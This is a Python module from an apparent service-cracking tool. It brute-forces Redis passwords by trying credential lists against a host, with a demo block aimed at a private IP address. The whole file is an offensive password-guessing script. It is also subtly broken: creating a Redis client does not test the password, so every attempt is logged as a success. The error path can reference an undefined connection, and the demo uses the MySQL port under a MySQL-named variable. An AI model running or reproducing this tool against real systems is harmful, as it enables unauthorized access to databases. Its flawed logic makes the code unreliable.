# coding: utf-8
import redis

from servicecrack.service.Base import BaseCrack
from servicecrack.utils.logg import Logging

logging = Logging("redis")

service_name = "redis"


class RedisCrack(BaseCrack):
    def __init__(self, host, port, usernames, passwords):
        # redis 连接不需要账号
        usernames = ["root"]
        super(RedisCrack, self).__init__(host, port, usernames, passwords, service_name)
        if not port:
            self.port = 6379

    def run(self):
        logging.info("start crack {}:{}".format(self.host, self.port))
        for username in self.usernames:
            for password in self.passwords:
                self.crack(username, password)
        logging.info("brute {} ending".format(self.service_name))
        logging.info(self.result)

    def crack(self, username, password):
        logging.debug("start use {} {}".format(username, password))
        success = 0
        try:
            conn = redis.Redis(host=self.host, port=self.port, password=password, socket_connect_timeout=self.timeout)
            logging.info("brute success :{} {}".format(username, password))
            success = 1
        except Exception as e:
            logging.debug(e)
            logging.debug("brute faild:{} {}".format(username, password))
            conn.close()
        finally:
            if not success:
                return
            conn.close()
            self.result.append({"username": username, "password": password})


if __name__ == '__main__':
    host = "10.0.81.85"
    port = "3306"
    usernames = ["root", "admin"]
    passwords = ["root", "admin"]
    mysqlcrack = RedisCrack(host, port, usernames, passwords)
    mysqlcrack.run()
